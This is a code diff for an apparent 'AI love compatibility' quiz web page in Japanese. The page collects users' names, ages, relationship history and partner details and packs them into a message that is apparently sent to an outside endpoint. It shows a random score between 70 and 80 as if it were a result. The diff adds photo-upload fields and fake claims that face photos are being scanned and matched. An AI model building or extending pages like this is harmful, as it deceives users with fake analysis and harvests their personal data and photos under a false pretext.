@@ -12,32 +12,36 @@
             background: linear-gradient(135deg, #74ebd5 0%, #9face6 100%); 
         }
         .box { 
-            background: #fff; padding: 40px; border-radius: 20px; 
+            background: #fff; padding: 30px; border-radius: 20px; 
             box-shadow: 0 10px 30px rgba(0,0,0,0.2); 
             width: 85%; max-width: 400px; text-align: center;
         }
-        input { 
-            width: 100%; padding: 15px; margin: 20px 0; border: 2px solid #eee; 
-            border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none;
+        input, .file-input { 
+            width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #eee; 
+            border-radius: 10px; box-sizing: border-box; font-size: 14px; outline: none;
         }
         button { 
             padding: 15px 30px; cursor: pointer; font-size: 16px; font-weight: bold;
             background: #5c67f2; color: white; border: none; border-radius: 50px;
-            transition: 0.3s;
+            transition: 0.3s; margin-top: 10px;
         }
-        #progress-container { width: 100%; background: #eee; height: 15px; border-radius: 10px; margin-top: 25px; overflow: hidden; display: none; }
+        #progress-container { width: 100%; background: #eee; height: 15px; border-radius: 10px; margin-top: 20px; overflow: hidden; display: none; }
         #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff9a9e, #fad0c4); transition: width 0.5s; }
-        #status-text { margin-top: 10px; font-size: 0.9em; color: #666; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2 id="title">AI恋愛相性診断</h2>
-        <p id="msg">あなたの情報を入力して相性をチェック！</p>
-        <input type="text" id="inputArea" style="display:none;" placeholder="入力してね...">
-        <button id="actionBtn">診断を開始する</button>
-        <div id="progress-container"><div id="progress-bar"></div></div>
-        <div id="status-text"></div>
+        <div id="content-area">
+            <p id="msg">写真（任意）をアップして診断開始！</p>
+            <input type="text" id="inputArea" style="display:none;" placeholder="入力してね...">
+            <div id="fileUploads" style="display:none;">
+                <input type="file" class="file-input" accept="image/*">
+                <input type="file" class="file-input" accept="image/*">
+            </div>
+            <button id="actionBtn">診断を開始する</button>
+            <div id="progress-container"><div id="progress-bar"></div></div>
+        </div>
     </div>
 
     <script>
@@ -54,6 +58,7 @@
                 step++;
                 document.getElementById('msg').innerText = questions[0];
                 document.getElementById('inputArea').style.display = 'block';
+                document.getElementById('fileUploads').style.display = 'block';
                 document.getElementById('actionBtn').innerText = '次へ進む';
             } else if (step <= questions.length) {
                 answers[keys[step - 1]] = inputVal;
@@ -68,24 +73,19 @@
         };
 
         function showLoading() {
-            document.getElementById('title').innerText = "解析中...";
+            document.getElementById('title').innerText = "AI解析中...";
+            document.getElementById('msg').innerText = "顔写真をスキャンして照合中...";
             document.getElementById('inputArea').style.display = 'none';
+            document.getElementById('fileUploads').style.display = 'none';
             document.getElementById('actionBtn').style.display = 'none';
             document.getElementById('progress-container').style.display = 'block';
 
-            const status = ["データを抽出中...", "相性を計算中...", "運命の糸を分析中...", "あと少し..."];
             let width = 0;
-            let i = 0;
-
             const interval = setInterval(() => {
                 width += 5;
                 document.getElementById('progress-bar').style.width = width + "%";
-                if (width % 25 === 0 && i < status.length) {
-                    document.getElementById('msg').innerText = status[i];
-                    i++;
-                }
                 if (width >= 100) clearInterval(interval);
-            }, 300); // 300ms間隔でじわじわ伸びる
+            }, 300);
 
             const score = Math.floor(Math.random() * (81 - 70) + 70);
             const data = { content: `**恋愛診断結果**\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
@@ -95,8 +95,8 @@
             });
 
             setTimeout(() => {
-                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 3em; font-weight: bold; color: #5c67f2;">${score}%</p><p>相性はかなり良いみたいだよ！</p>`;
-            }, 6500); // 約6.5秒のロード時間
+                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 3em; font-weight: bold; color: #5c67f2;">${score}%</p><p>写真分析もバッチリ！運命を感じるね！</p>`;
+            }, 6500);
         }
     </script>
 </body>
